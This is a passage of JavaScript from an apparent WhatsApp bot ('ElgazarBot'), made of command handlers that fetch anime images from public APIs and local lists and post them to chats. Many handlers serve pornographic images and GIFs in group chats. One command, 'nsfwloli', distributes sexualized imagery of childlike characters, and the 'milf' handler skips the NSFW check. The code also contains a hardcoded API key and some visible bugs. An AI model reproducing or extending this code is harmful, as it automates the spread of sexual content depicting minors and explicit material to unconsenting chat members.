case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
						ElgazarBot.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
case 'loli-waifu':
					m.reply(mess.wait)
					axios.get(`https://api.waifu.pics/sfw/waifu`)
					.then(({data}) => {
					ElgazarBot.sendImage(m.chat, data.url, mess.success, m)
					})
					break
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                ElgazarBot.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: trapbot,
  headerType: 1
  }     
            await ElgazarBot.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: hnekobot,
  headerType: 1
  }      
            await ElgazarBot.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await ElgazarBot.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gasm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  
case 'milf':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break 
case 'ahegao':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'مانجا':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await ElgazarBot.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await ElgazarBot.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case'slap2':
if(!quoted){
const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const mention = msg
const mentionedId = await ElgazarBot.getName(mention.mentionedIds)
ctv = `@${contacts.number} *Slapped* @${mentionedId.number}`
const ahh = []
m.reply(media,m.chat , {mentions:[contacts,mentionedId], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}else if(quoted){
const qmid = quoted.author
const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const contact1 = await ElgazarBot.getName(qmid)
ctv = `@${contacts.number} *Slapped* @${contact1.number} `
m.reply(media,m.chat , {mentions:[contacts,contact1 ], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}
break

case 'animesmug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let button1ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'foxgirl':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let button12ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'نوم' :
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/sfw/nom`)
 let xxhnekobot = [
    {buttonId: `.نوم`, buttonText: {displayText: `التالي ⚡`}, type: 1},
    ]
  let xx1button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `خد اهي✨!`,
  buttons: xxhnekobot,
  headerType: 1
  }      
            await ElgazarBot.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewaifu':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let button112ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
                var wbutsss = [
        {buttonId: `animeneko`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbutsss,
      headerType: 4
      }
            await ElgazarBot.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                    return('Error!')
                })               
                break
case 'animecuddle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonsosMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animeslap':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let btutttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepat':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let xxbuttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/neko`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonsTsMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonussMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekiss':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let bxxuttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewlp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttoxnssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonssxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecry':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cry`)
                           var wbutt1sss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let button1ssxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbutt1sss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekill':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/kill`)
                           var wbuttszzss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszzss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animelick':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
                           var wbuttszz12ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx12Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz12ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebite':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bite`)
                           var wbuttszz123ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx123Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz123ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeyeet':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/yeet`)
                           var wbuttszz124ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx124Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz124ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebully':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
                           var wbuttszz125ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx125Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz125ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebonk':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bonk`)
                           var wbuttszz126ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx126Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz126ss,
      headerType: 4
      }     
            await ElgazarBot.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewink':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wink`)
                           var wbuttszz127ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonszzsx127Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz127ss,
      headerType: 4
      }     
